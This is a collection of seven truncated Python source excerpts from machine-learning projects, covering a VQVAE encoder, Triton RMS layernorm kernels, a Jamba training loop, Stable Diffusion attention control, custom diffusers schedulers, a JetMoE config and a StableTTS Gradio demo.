[
    "import torch\nimport torch.nn as nn\nimport torch.nn.functional as F\n\n\n# this file only provides the 2 modules used in VQVAE\n__all__ = ['Encoder', 'Decoder',]\n\n\n\"\"\"\nReferences: https://github.com/CompVis/stable-diffusion/blob/21f890f9da3cfbeaba8e2ac3c425ee9e998d5229/ldm/modules/diffusionmodules/model.py\n\"\"\"\n# swish\ndef nonlinearity(x):\n    return x * torch.sigmoid(x)\n\n\ndef Normalize(in_channels, num_groups=32):\n    return torch.nn.GroupNorm(num_groups=num_groups, num_channels=in_channels, eps=1e-6, affine=True)\n\n\nclass Upsample2x(nn.Module):\n    def __init__(self, in_channels):\n        super().__init__()\n        self.conv = torch.nn.Conv2d(in_channels, in_channels, kernel_size=3, stride=1, padding=1)\n    \n    def forward(self, x):\n        return self.conv(F.interpolate(x, scale_factor=2, mode='nearest'))\n\n\nclass Downsample2x(nn.Module):\n    def __init__(self, in_channels):\n        super().__init__()\n        self.conv = torch.nn.Conv2d(in_channels, in_channels, kernel_size=3, stride=2, padding=0)\n    \n    def forward(self, x):\n        return self.conv(F.pad(x, pad=(0, 1, 0, 1), mode='constant', value=0))\n\n\nclass ResnetBlock(nn.Module):\n    def __init__(self, *, in_channels, out_channels=None, dropout): # conv_shortcut=False,  # conv_shortcut: always False in VAE\n        super().__init__()\n        self.in_channels = in_channels\n        out_channels = in_channels if out_channels is None else out_channels\n        self.out_channels = out_channels\n        \n        self.norm1 = Normalize(in_channels)\n        self.conv1 = torch.nn.Conv2d(in_channels, out_channels, kernel_size=3, stride=1, padding=1)\n        self.norm2 = Normalize(out_channels)\n        self.dropout = torch.nn.Dropout(dropout) if dropout > 1e-6 else nn.Identity()\n        self.conv2 = torch.nn.Conv2d(out_channels, out_channels, kernel_size=3, stride=1, padding=1)\n        if self.in_channels != self.out_channels:\n            self.nin_shortcut = torch.nn.Conv2d(in_channels, out_channels, kernel_size=1, stride=1, padding=0)\n        else:\n            self.nin_shortcut = nn.Identity()\n    \n    def forward(self, x):\n        h = self.conv1(F.silu(self.norm1(x), inplace=True))\n        h = self.conv2(self.dropout(F.silu(self.norm2(h), inplace=True)))\n        return self.nin_shortcut(x) + h\n\n\nclass AttnBlock(nn.Module):\n    def __init__(self, in_channels):\n        super().__init__()\n        self.C = in_channels\n        \n        self.norm = Normalize(in_channels)\n        self.qkv = torch.nn.Conv2d(in_channels, 3*in_channels, kernel_size=1, stride=1, padding=0)\n        self.w_ratio = int(in_channels) ** (-0.5)\n        self.proj_out = torch.nn.Conv2d(in_channels, in_channels, kernel_size=1, stride=1, padding=0)\n    \n    def forward(self, x):\n        qkv = self.qkv(self.norm(x))\n        B, _, H, W = qkv.shape  # should be B,3C,H,W\n        C = self.C\n        q, k, v = qkv.reshape(B, 3, C, H, W).unbind(1)\n        \n        # compute attention\n        q = q.view(B, C, H * W).contiguous()\n        q = q.permute(0, 2, 1).contiguous()     # B,HW,C\n        k = k.view(B, C, H * W).contiguous()    # B,C,HW\n        w = torch.bmm(q, k).mul_(self.w_ratio)  # B,HW,HW    w[B,i,j]=sum_c q[B,i,C]k[B,C,j]\n        w = F.softmax(w, dim=2)\n        \n        # attend to values\n        v = v.view(B, C, H * W).contiguous()\n        w = w.permute(0, 2, 1).contiguous()  # B,HW,HW (first HW of k, second of q)\n        h = torch.bmm(v, w)  # B, C,HW (HW of q) h[B,C,j] = sum_i v[B,C,i] w[B,i,j]\n        h = h.view(B, C, H, W).contiguous()\n        \n        return x + self.proj_out(h)\n\n\ndef make_attn(in_channels, using_sa=True):\n    return AttnBlock(in_channels) if using_sa else nn.Identity()\n\n\nclass Encoder(nn.Module):\n    def __init__(\n        self, *, ch=128, ch_mult=(1, 2, 4, 8), num_res_blocks=2,\n        dropout=0.0, in_channels=3,\n        z_channels, double_z=False, using_sa=True, using_mid_sa=True,\n    ):\n        super().__init__()\n        self.ch = ch\n        self.num_resolutions = len(ch_mult)\n        self.downsample_ratio = 2 ** (self.num_resolutions - 1)\n        self.num_res_blocks = num_res_blocks\n        self.in_channels = in_channels\n        \n        # downsampling\n        self.conv_in = torch.nn.Conv2d(in_channels, self.ch, kernel_size=3, stride=1, padding=1)\n        \n        in_ch_mult = (1,) + tuple(ch_mult)\n        self.down = nn.ModuleList()\n        for i_level in range(self.num_resolutions):\n            block = nn.ModuleList()\n            attn = nn.ModuleList()\n            block_in = ch * in_ch_mult[i_level]\n            block_out = ch * ch_mult[i_level]\n            for i_block in range(self.num_res_blocks):\n                block.append(ResnetBlock(in_channels=block_in, out_channels=block_out, dropout=dropout))\n                block_in = block_out\n                if i_level == self.num_resolutions - 1 and using_sa:\n                    attn.append(make_attn(block_in, using_sa=True))\n            down = nn.Module()\n            down.block = block\n            down.attn = attn\n            ",
    "#Kindly borrowed from UnSloth's implementation\nimport triton\nimport triton.language as tl\nimport torch\nfrom .utils import calculate_settings\n\n\n@triton.jit\ndef _rms_layernorm_forward(\n    Y, Y_row_stride,\n    X, X_row_stride,\n    W, W_row_stride,\n    r, r_row_stride,\n    n_cols, eps,\n    BLOCK_SIZE : tl.constexpr\n):\n    \"\"\"\n        Fast RMS Layernorm kernel\n        Inspiration from a Triton tutorial:\n        https://triton-lang.org/main/getting-started/tutorials/05-layer-norm.html\n    \"\"\"\n    row_idx = tl.program_id(0)\n    col_offsets = tl.arange(0, BLOCK_SIZE)\n    mask = col_offsets < n_cols\n\n    Y += row_idx * Y_row_stride\n    X += row_idx * X_row_stride\n    r += row_idx * r_row_stride\n\n    X_row = tl.load(X + col_offsets, mask = mask, other = 0).to(tl.float32)\n    W_row = tl.load(W + col_offsets, mask = mask, other = 0)#.to(tl.float32)\n\n    row_var = tl.sum(X_row * X_row, axis = 0) / n_cols\n    inv_var = tl.math.rsqrt(row_var + eps)\n    tl.store(r, inv_var)\n    normed = X_row * inv_var\n    normed = normed.to(W_row.dtype) # Exact copy from HF\n    output = normed * W_row\n    tl.store(Y + col_offsets, output, mask = mask)\npass\n\n\n@triton.heuristics({\"GEMMA\": lambda args: args[\"GEMMA\"],})\n@triton.jit\ndef _rms_layernorm_backward(\n    dY, dY_row_stride,\n    X,   X_row_stride,\n    W,   W_row_stride,\n    r,   r_row_stride,\n    dW, dW_row_stride,\n    n_cols, eps,\n    GEMMA      : tl.constexpr,\n    BLOCK_SIZE : tl.constexpr,\n):\n    \"\"\"\n        Fast RMS Layernorm kernel for the backward pass\n        Inspiration from a Triton tutorial:\n        https://triton-lang.org/main/getting-started/tutorials/05-layer-norm.html\n    \"\"\"\n    row_idx = tl.program_id(0)\n    col_offsets = tl.arange(0, BLOCK_SIZE)\n    mask = col_offsets < n_cols\n\n    dY += row_idx * dY_row_stride\n    X  += row_idx *  X_row_stride\n    r  += row_idx *  r_row_stride\n\n    dY_row = tl.load(dY + col_offsets, mask = mask, other = 0).to(tl.float32)\n    X_row  = tl.load(X  + col_offsets, mask = mask, other = 0).to(tl.float32)\n    W_row  = tl.load(W  + col_offsets, mask = mask, other = 0).to(tl.float32)\n\n    # Get saved row variance\n    inv_var = tl.load(r).to(tl.float32)\n    normed = X_row * inv_var\n\n    if GEMMA: dY_W = dY_row * (W_row + 1.0)\n    else:     dY_W = dY_row * W_row\n\n    rowsum_dY_normed = tl.sum(dY_W * normed, axis = 0)\n    output = inv_var/n_cols * (n_cols*dY_W - normed*rowsum_dY_normed)\n    tl.store(dY + col_offsets, output, mask = mask)\npass\n\n\n@triton.jit\ndef _gemma_rms_layernorm_forward(\n    Y, Y_row_stride,\n    X, X_row_stride,\n    W, W_row_stride,\n    r, r_row_stride,\n    n_cols, eps,\n    BLOCK_SIZE : tl.constexpr,\n):\n    # Copies https://github.com/google-deepmind/gemma/blob/main/gemma/layers.py#L31\n    # and https://github.com/keras-team/keras-nlp/blob/v0.8.2/keras_nlp/models/gemma/rms_normalization.py#L33\n    # exactly. Essentially all in float32!\n    row_idx = tl.program_id(0)\n    col_offsets = tl.arange(0, BLOCK_SIZE)\n    mask = col_offsets < n_cols\n\n    Y += row_idx * Y_row_stride\n    X += row_idx * X_row_stride\n    r += row_idx * r_row_stride\n\n    X_row = tl.load(X + col_offsets, mask = mask, other = 0).to(tl.float32)\n    W_row = tl.load(W + col_offsets, mask = mask, other = 0).to(tl.float32)\n\n    row_var = tl.sum(X_row * X_row, axis = 0) / n_cols\n    inv_var = 1.0 / tl.sqrt(row_var + eps) # Must be 1/sqrt to match Deepmind's impl\n    tl.store(r, inv_var)\n    normed = X_row * inv_var\n    output = normed * (W_row + 1.0)\n\n    tl.store(Y + col_offsets, output, mask = mask)\npass\n\n\nclass Fast_RMS_Layernorm(torch.autograd.Function):\n    @staticmethod\n    def forward(ctx, X, W, eps, gemma = False):\n        shape = X.shape\n        dim = shape[-1]\n        X = X.view(-1, dim)\n        n_rows, n_cols = X.shape\n        BLOCK_SIZE, num_warps = calculate_settings(n_cols)\n\n        Y = torch.empty((n_rows, n_cols), dtype = X.dtype, device = \"cuda\")\n        r = torch.empty(n_rows, dtype = torch.float32, device = \"cuda\")\n\n        fx = _gemma_rms_layernorm_forward if gemma else _rms_layernorm_forward\n        fx[(n_rows,)](\n            Y, Y.stride(0),\n            X, X.stride(0),\n            W, W.stride(0),\n            r, r.stride(0),\n            n_cols, eps,\n            BLOCK_SIZE = BLOCK_SIZE,\n            num_warps  = num_warps,\n        )\n        ctx.eps = eps\n        ctx.BLOCK_SIZE = BLOCK_SIZE\n        ctx.num_warps  = num_warps\n        ctx.GEMMA = gemma\n        ctx.save_for_backward(X, W, r)\n        return Y.view(*shape)\n    pass\n\n    @staticmethod\n    def backward(ctx, dY):\n        shape = dY.shape\n        dim = shape[-1]\n        dY = dY.view(-1, dim)\n        X, W, r = ctx.saved_tensors\n        n_rows, n_cols = dY.shape\n        dW = X\n\n        _rms_layernorm_backward[(n_rows,)](\n            dY, dY.stride(0),\n            X,  X .stride(0),\n            W,  W .stride(0),\n            r,  r .stride(0),\n            dW, dW.stride(0),\n            n_cols, ctx.eps,\n            GEMMA      = ctx.GEMMA,\n            BLOCK_SIZE = ctx.BLOCK_SIZE,\n            num_warps",
    "import torch\nimport torch.nn as nn\nimport torch.optim as optim\nfrom torch.utils.data import DataLoader\nfrom datasets import load_dataset\nfrom transformers import AutoTokenizer\nfrom jamba.model import Jamba\n\n# Load the dataset from Hugging Face\ndataset = load_dataset(\"wikitext\", \"wikitext-2-raw-v1\", split=\"train\")\n\n# Initialize the tokenizer\ntokenizer = AutoTokenizer.from_pretrained(\"gpt2\", use_fast=True)\ntokenizer.pad_token = tokenizer.eos_token\n\n\n# Tokenize the dataset\ndef tokenize_function(examples):\n    return tokenizer(\n        examples[\"text\"],\n        padding=\"max_length\",\n        truncation=True,\n        max_length=100,\n        return_tensors=\"pt\",\n    )\n\n\ntokenized_datasets = dataset.map(tokenize_function, batched=True)\ntokenized_datasets.set_format(type=\"torch\", columns=[\"input_ids\"])\n\n\n# DataLoader\ndef collate_fn(batch):\n    input_ids = torch.stack([item[\"input_ids\"] for item in batch])\n    # Create targets by shifting input_ids one token to the left\n    labels = torch.roll(input_ids, -1, dims=-1)\n    return input_ids.squeeze(), labels.squeeze()\n\n\ndataloader = DataLoader(\n    tokenized_datasets,\n    batch_size=32,\n    shuffle=True,\n    collate_fn=collate_fn,\n)\n\n# Initialize the Jamba model with tokenizer's vocab size\nmodel = Jamba(\n    dim=512,\n    depth=6,\n    num_tokens=tokenizer.vocab_size,\n    d_state=256,\n    d_conv=128,\n    heads=8,\n    num_experts=8,\n    num_experts_per_token=2,\n)\n\n# Loss function and optimizer\ncriterion = nn.CrossEntropyLoss()\noptimizer = optim.Adam(model.parameters(), lr=0.001)\n\n# Training loop\nepochs = 5\nfor epoch in range(epochs):\n    for inputs, targets in dataloader:\n        optimizer.zero_grad()  # Zero the gradients\n\n        # Forward pass\n        outputs = model(inputs)\n        loss = criterion(\n            outputs.transpose(1, 2), targets\n        )  # Adjust for cross-entropy expecting class dimension at dim=1\n\n        # Backward pass and optimize\n        loss.backward()\n        optimizer.step()\n\n    print(f\"Epoch {epoch+1}, Loss: {loss.item()}\")\n\nprint(\"Training complete!\")\n",
    "# *************************************************************************\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# *************************************************************************\n\n\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\n\nfrom einops import rearrange, repeat\n\n\nclass AttentionBase:\n\n    def __init__(self):\n        self.cur_step = 0\n        self.num_att_layers = -1\n        self.cur_att_layer = 0\n\n    def after_step(self):\n        pass\n\n    def __call__(self, q, k, v, is_cross, place_in_unet, num_heads, **kwargs):\n        out = self.forward(q, k, v, is_cross, place_in_unet, num_heads, **kwargs)\n        self.cur_att_layer += 1\n        if self.cur_att_layer == self.num_att_layers:\n            self.cur_att_layer = 0\n            self.cur_step += 1\n            # after step\n            self.after_step()\n        return out\n\n    def forward(self, q, k, v, is_cross, place_in_unet, num_heads, **kwargs):\n        out = F.scaled_dot_product_attention(q, k, v, attn_mask=None, dropout_p=0.0, is_causal=False)\n        out = rearrange(out, 'b h n d -> b n (h d)')\n        return out\n\n    def reset(self):\n        self.cur_step = 0\n        self.cur_att_layer = 0\n\n\nclass MutualSelfAttentionControl(AttentionBase):\n\n    def __init__(self, start_step=4, start_layer=10, layer_idx=None, step_idx=None, total_steps=50, guidance_scale=7.5):\n        \"\"\"\n        Mutual self-attention control for Stable-Diffusion model\n        Args:\n            start_step: the step to start mutual self-attention control\n            start_layer: the layer to start mutual self-attention control\n            layer_idx: list of the layers to apply mutual self-attention control\n            step_idx: list the steps to apply mutual self-attention control\n            total_steps: the total number of steps\n        \"\"\"\n        super().__init__()\n        self.total_steps = total_steps\n        self.start_step = start_step\n        self.start_layer = start_layer\n        self.layer_idx = layer_idx if layer_idx is not None else list(range(start_layer, 16))\n        self.step_idx = step_idx if step_idx is not None else list(range(start_step, total_steps))\n        # store the guidance scale to decide whether there are unconditional branch\n        self.guidance_scale = guidance_scale\n        print(\"step_idx: \", self.step_idx)\n        print(\"layer_idx: \", self.layer_idx)\n\n    def forward(self, q, k, v, is_cross, place_in_unet, num_heads, **kwargs):\n        \"\"\"\n        Attention forward function\n        \"\"\"\n        if is_cross or self.cur_step not in self.step_idx or self.cur_att_layer // 2 not in self.layer_idx:\n            return super().forward(q, k, v, is_cross, place_in_unet, num_heads, **kwargs)\n\n        if self.guidance_scale > 1.0:\n            qu, qc = q[0:2], q[2:4]\n            ku, kc = k[0:2], k[2:4]\n            vu, vc = v[0:2], v[2:4]\n\n            # merge queries of source and target branch into one so we can use torch API\n            qu = torch.cat([qu[0:1], qu[1:2]], dim=2)\n            qc = torch.cat([qc[0:1], qc[1:2]], dim=2)\n\n            out_u = F.scaled_dot_product_attention(qu, ku[0:1], vu[0:1], attn_mask=None, dropout_p=0.0, is_causal=False)\n            out_u = torch.cat(out_u.chunk(2, dim=2), dim=0) # split the queries into source and target batch\n            out_u = rearrange(out_u, 'b h n d -> b n (h d)')\n\n            out_c = F.scaled_dot_product_attention(qc, kc[0:1], vc[0:1], attn_mask=None, dropout_p=0.0, is_causal=False)\n            out_c = torch.cat(out_c.chunk(2, dim=2), dim=0) # split the queries into source and target batch\n            out_c = rearrange(out_c, 'b h n d -> b n (h d)')\n\n            out = torch.cat([out_u, out_c], dim=0)\n        else:\n            q = torch.cat([q[0:1], q[1:2]], dim=2)\n            out = F.scaled_dot_product_attention(q, k[0:1], v[0:1], attn_mask=None, dropout_p=0.0, is_causal=False)\n            out = torch.cat(out.chunk(2, dim=2), dim=0) # split the queries into source and target batch\n            out = rearrange(out, 'b h n d -> b n (h d)')\n        return out\n\n# forward function for default attention processor\n# modified from __call__ function of AttnProcessor in diffusers\ndef override_attn_proc_forward(attn, editor, place_in_unet):\n    def forward(x, encoder_hidden_states=None, attention_mask=None, context=None, mask=None):\n        \"\"\"\n        The attention is similar to the original implementation of LDM CrossAttention class\n        except adding some modifications on the attention\n     ",
    "\nfrom diffusers.schedulers.scheduling_ddpm import *\n\nfrom diffusers.schedulers.scheduling_euler_ancestral_discrete import *\nfrom diffusers.schedulers.scheduling_dpmsolver_multistep import *\nfrom diffusers.configuration_utils import ConfigMixin, register_to_config\nimport math\nfrom dataclasses import dataclass\nfrom typing import List, Optional, Tuple, Union\n\nimport numpy as np\nimport torch\n\nclass ModifiedDPMSolverMultistepScheduler(DPMSolverMultistepScheduler):\n\n    def step(\n        self,\n        model_output: torch.FloatTensor,\n        timestep: int,\n        sample: torch.FloatTensor,\n        generator=None,\n        return_dict: bool = True,\n        skip_noise: bool = False,\n    ) -> Union[SchedulerOutput, Tuple]:\n        \"\"\"\n        Predict the sample from the previous timestep by reversing the SDE. This function propagates the sample with\n        the multistep DPMSolver.\n\n        Args:\n            model_output (`torch.FloatTensor`):\n                The direct output from learned diffusion model.\n            timestep (`int`):\n                The current discrete timestep in the diffusion chain.\n            sample (`torch.FloatTensor`):\n                A current instance of a sample created by the diffusion process.\n            generator (`torch.Generator`, *optional*):\n                A random number generator.\n            return_dict (`bool`):\n                Whether or not to return a [`~schedulers.scheduling_utils.SchedulerOutput`] or `tuple`.\n\n        Returns:\n            [`~schedulers.scheduling_utils.SchedulerOutput`] or `tuple`:\n                If return_dict is `True`, [`~schedulers.scheduling_utils.SchedulerOutput`] is returned, otherwise a\n                tuple is returned where the first element is the sample tensor.\n\n        \"\"\"\n        if self.num_inference_steps is None:\n            raise ValueError(\n                \"Number of inference steps is 'None', you need to run 'set_timesteps' after creating the scheduler\"\n            )\n\n        if isinstance(timestep, torch.Tensor):\n            timestep = timestep.to(self.timesteps.device)\n        step_index = (self.timesteps == timestep).nonzero()\n        if len(step_index) == 0:\n            step_index = len(self.timesteps) - 1\n        else:\n            step_index = step_index.item()\n        prev_timestep = 0 if step_index == len(self.timesteps) - 1 else self.timesteps[step_index + 1]\n        lower_order_final = (\n            (step_index == len(self.timesteps) - 1) and self.config.lower_order_final and len(self.timesteps) < 15\n        )\n        lower_order_second = (\n            (step_index == len(self.timesteps) - 2) and self.config.lower_order_final and len(self.timesteps) < 15\n        )\n\n        model_output = self.convert_model_output(model_output, timestep, sample)\n        for i in range(self.config.solver_order - 1):\n            self.model_outputs[i] = self.model_outputs[i + 1]\n        self.model_outputs[-1] = model_output\n\n        if (self.config.algorithm_type in [\"sde-dpmsolver\", \"sde-dpmsolver++\"]):\n            noise = randn_tensor(\n                model_output.shape, generator=generator, device=model_output.device, dtype=model_output.dtype\n            )\n        else:\n            noise = None\n\n        if(skip_noise and (noise is not None)):\n            noise = torch.zeros_like(noise)\n\n        if self.config.solver_order == 1 or self.lower_order_nums < 1 or lower_order_final:\n            prev_sample = self.dpm_solver_first_order_update(\n                model_output, timestep, prev_timestep, sample, noise=noise\n            )\n        elif self.config.solver_order == 2 or self.lower_order_nums < 2 or lower_order_second:\n            timestep_list = [self.timesteps[step_index - 1], timestep]\n            prev_sample = self.multistep_dpm_solver_second_order_update(\n                self.model_outputs, timestep_list, prev_timestep, sample, noise=noise\n            )\n        else:\n            timestep_list = [self.timesteps[step_index - 2], self.timesteps[step_index - 1], timestep]\n            prev_sample = self.multistep_dpm_solver_third_order_update(\n                self.model_outputs, timestep_list, prev_timestep, sample\n            )\n\n        if self.lower_order_nums < self.config.solver_order:\n            self.lower_order_nums += 1\n\n        if not return_dict:\n            return (prev_sample,)\n\n        return SchedulerOutput(prev_sample=prev_sample)\n\n\nclass ModifiedEulerAScheduler(EulerAncestralDiscreteScheduler):\n\n    def step(\n        self,\n        model_output: torch.FloatTensor,\n        timestep: Union[float, torch.FloatTensor],\n        sample: torch.FloatTensor,\n        generator: Optional[torch.Generator] = None,\n        return_dict: bool = True,\n        skip_noise: bool = False,\n    ) -> Union[EulerAncestralDiscreteSchedulerOutput, Tuple]:\n        \"\"\"\n        Predict the sample from the previous timestep by reversing the SDE. This function propagates the diffusion\n        process from the learned model outputs (most often the predicted noi",
    "# coding=utf-8\n# Copyright 2024 JetMoE AI and the HuggingFace Inc. team. All rights reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"JetMoE model configuration\"\"\"\n\nfrom transformers.configuration_utils import PretrainedConfig\nfrom transformers.utils import logging\n\n\nlogger = logging.get_logger(__name__)\n\n\nclass JetMoEConfig(PretrainedConfig):\n    r\"\"\"\n    This is the configuration class to store the configuration of a [`JetMoEModel`]. It is used to instantiate an\n    JetMoE model according to the specified arguments, defining the model architecture. Instantiating a configuration\n    with the defaults will yield a configuration of the JetMoE-4B.\n\n    [jetmoe/jetmoe-8b](https://huggingface.co/jetmoe/jetmoe-8b)\n\n    Configuration objects inherit from [`PretrainedConfig`] and can be used to control the model outputs. Read the\n    documentation from [`PretrainedConfig`] for more information.\n\n\n    Args:\n        vocab_size (`int`, *optional*, defaults to 32000):\n            Vocabulary size of the JetMoE model. Defines the number of different tokens that can be represented by the\n            `inputs_ids` passed when calling [`JetMoEModel`]\n        hidden_size (`int`, *optional*, defaults to 2048):\n            Dimension of the hidden representations.\n        num_hidden_layers (`int`, *optional*, defaults to 12): Defines the number of blocks.\n        num_attention_heads (`int`, *optional*, defaults to 32):\n            Number of attention heads for each attention layer in the Transformer encoder.\n        num_key_value_heads (`int`, *optional*, defaults to 16):\n            Number of attention heads for each key and value in the Transformer encoder.\n        kv_channels (`int`, *optional*, defaults to 128): Defines the number of channels for the key and value tensors.\n        ffn_hidden_size (`int`, *optional*, defaults to 5632): Defines the hidden size of the feed-forward layer.\n        max_position_embeddings (`int`, *optional*, defaults to 4096):\n            The maximum sequence length that this model might ever be used with. JetMoE's sliding window attention\n            allows sequence of up to 4096*32 tokens.\n        activation_function (`string`, *optional*, defaults to `\"silu\"`): Defines the activation function for MLP experts.\n        glu (`bool`, *optional*, defaults to `True`): Whether to use Gated Linear Units in the MLP experts.\n        moe_num_experts (`int`, *optional*, defaults to 8): Defines the number of experts in the mixture of experts.\n        moe_top_k (`int, *optional*, defaults to 2): Defines the number of experts to use for each token.\n        use_cache (`bool`, *optional*, defaults to `True`):\n            Whether or not the model should return the last key/values attentions (not used by all models). Only\n            relevant if `config.is_decoder=True`.\n        bos_token_id (`int`, *optional*, defaults to 1):\n            The id of the \"beginning-of-sequence\" token.\n        eos_token_id (`int`, *optional*, defaults to 2):\n            The id of the \"end-of-sequence\" token.\n        tie_word_embeddings (`bool`, *optional*, defaults to `True`):\n            Whether the model's input and output word embeddings should be tied.\n        bias (`bool`, *optional*, defaults to `True`): Whether to use bias in the feed-forward and attention layer.\n        rope_theta (`float`, *optional*, defaults to 10000.0):\n            The base period of the RoPE embeddings.\n        rms_norm_eps (`float`, *optional*, defaults to 1e-06):\n            The epsilon used by the rms normalization layers.\n        initializer_range (`float`, *optional*, defaults to 0.01):\n            The standard deviation of the truncated_normal_initializer for initializing all weight matrices.\n\n    ```python\n    >>> from transformers import JetMoEModel, JetMoEConfig\n\n    >>> # Initializing a JetMoE 4B style configuration\n    >>> configuration = JetMoEConfig()\n\n    >>> # Initializing a model from the JetMoE 4B style configuration\n    >>> model = JetMoEModel(configuration)\n\n    >>> # Accessing the model configuration\n    >>> configuration = model.config\n    ```\"\"\"\n\n    model_type = \"jetmoe\"\n    keys_to_ignore_at_inference = [\"past_key_values\"]\n\n    def __init__(\n        self,\n        vocab_size=32000,\n        hidden_size=2048,\n        num_hidden_layers=12,\n        num_attention_heads=32,\n        num_key_value_heads=16,\n        kv_channels=128,\n        ffn_hidden_size=5632,\n        max_position_embeddings=4096,\n        activation_function=\"silu\",\n    ",
    "import os\nos.environ['TMPDIR'] = './temps' # avoid the system default temp folder not having access permissions\nos.environ['HF_ENDPOINT'] = 'https://hf-mirror.com' # use huggingfacae mirror for users that could not login to huggingface\n\nfrom dataclasses import asdict\nfrom text import symbols\nimport torch\nimport torchaudio\n\nfrom utils.audio import LogMelSpectrogram\nfrom config import ModelConfig, VocosConfig, MelConfig\nfrom models.model import StableTTS\nfrom vocos_pytorch.models.model import Vocos\nfrom text.mandarin import chinese_to_cnm3\nfrom text.english import english_to_ipa2\nfrom text.japanese import japanese_to_ipa2\nfrom text import cleaned_text_to_sequence\nfrom datas.dataset import intersperse\n\nimport gradio as gr\nimport numpy as np\nimport matplotlib.pyplot as plt\nfrom pathlib import Path\n\ndevice = 'cuda' if torch.cuda.is_available() else 'cpu'\n\ng2p_mapping = {\n    'chinese': chinese_to_cnm3,\n    'japanese': japanese_to_ipa2,\n    'english': english_to_ipa2,\n}\n\n@ torch.inference_mode()\ndef inference(text: str, ref_audio: torch.Tensor, language: str, checkpoint_path: str, step: int=10) -> torch.Tensor:\n    global last_checkpoint_path\n    if checkpoint_path != last_checkpoint_path:\n        tts_model.load_state_dict(torch.load(checkpoint_path, map_location='cpu')) \n        last_checkpoint_path = checkpoint_path\n        \n    phonemizer = g2p_mapping.get(language)\n    \n    # prepare input for tts model\n    x = torch.tensor(intersperse(cleaned_text_to_sequence(phonemizer(text)), item=0), dtype=torch.long, device=device).unsqueeze(0)\n    x_len = torch.tensor([x.size(-1)], dtype=torch.long, device=device)\n    waveform, sr = torchaudio.load(ref_audio)\n    if sr != sample_rate:\n        waveform = torchaudio.functional.resample(waveform, sr, sample_rate)\n    y = mel_extractor(waveform).to(device)\n    \n    # inference\n    mel = tts_model.synthesise(x, x_len, step, y=y, temperature=1, length_scale=1)['decoder_outputs']\n    audio = vocoder(mel)\n    \n    # process output for gradio\n    audio_output = (sample_rate, (audio.cpu().squeeze(0).numpy() * 32767).astype(np.int16)) # (samplerate, int16 audio) for gr.Audio\n    mel_output = plot_mel_spectrogram(mel.cpu().squeeze(0).numpy()) # get the plot of mel\n    return audio_output, mel_output\n\ndef get_pipeline(n_vocab: int, tts_model_config: ModelConfig, mel_config: MelConfig, vocoder_config: VocosConfig, tts_checkpoint_path, vocoder_checkpoint_path):\n    tts_model = StableTTS(n_vocab, mel_config.n_mels, **asdict(tts_model_config))\n    mel_extractor = LogMelSpectrogram(mel_config)\n    vocoder = Vocos(vocoder_config, mel_config)\n    # tts_model.load_state_dict(torch.load(tts_checkpoint_path, map_location='cpu'))\n    tts_model.to(device)\n    tts_model.eval()\n    vocoder.load_state_dict(torch.load(vocoder_checkpoint_path, map_location='cpu'))\n    vocoder.to(device)\n    vocoder.eval()\n    return tts_model, mel_extractor, vocoder\n\ndef plot_mel_spectrogram(mel_spectrogram):\n    plt.close() # prevent memory leak\n    fig, ax = plt.subplots(figsize=(20, 8))\n    ax.imshow(mel_spectrogram, aspect='auto', origin='lower')\n    plt.axis('off')\n    fig.subplots_adjust(left=0, right=1, top=1, bottom=0) # remove white edges\n    return fig\n\n\ndef main():\n    tts_model_config = ModelConfig()\n    mel_config = MelConfig()\n    vocoder_config = VocosConfig()\n\n    tts_checkpoint_path = './checkpoints' # the folder that contains StableTTS checkpoints\n    vocoder_checkpoint_path = './checkpoints/vocoder.pt'\n\n    global tts_model, mel_extractor, vocoder, sample_rate, last_checkpoint_path\n    sample_rate = mel_config.sample_rate\n    last_checkpoint_path = None\n    tts_model, mel_extractor, vocoder = get_pipeline(len(symbols), tts_model_config, mel_config, vocoder_config, tts_checkpoint_path, vocoder_checkpoint_path)\n    \n    tts_checkpoint_path = [path for path in Path(tts_checkpoint_path).rglob('*.pt') if 'optimizer' and 'vocoder' not in path.name]\n\n    # gradio wabui\n    gui_title = 'StableTTS'\n    gui_description = \"\"\"Next-generation TTS model using flow-matching and DiT, inspired by Stable Diffusion 3.\"\"\"\n    with gr.Blocks(analytics_enabled=False) as demo:\n\n        with gr.Row():\n            with gr.Column():\n                gr.Markdown(f\"# {gui_title}\")\n                gr.Markdown(gui_description)\n\n        with gr.Row():\n            with gr.Column():\n                input_text_gr = gr.Textbox(\n                    label=\"Input Text\",\n                    info=\"One or two sentences at a time is better. Up to 200 text characters.\",\n                    value=\"\u4f60\u597d\uff0c\u4e16\u754c\uff01\",\n                )\n             \n                ref_audio_gr = gr.Audio(\n                    label=\"Reference Speaker\",\n                    type=\"filepath\"\n                )\n                \n                language_gr = gr.Dropdown(\n                    label='Language',\n                    choices=list(g2p_mapping.keys()),\n                    value = 'chinese'\n                )\n                \n                checkpoint_gr = gr.Dropdown(",
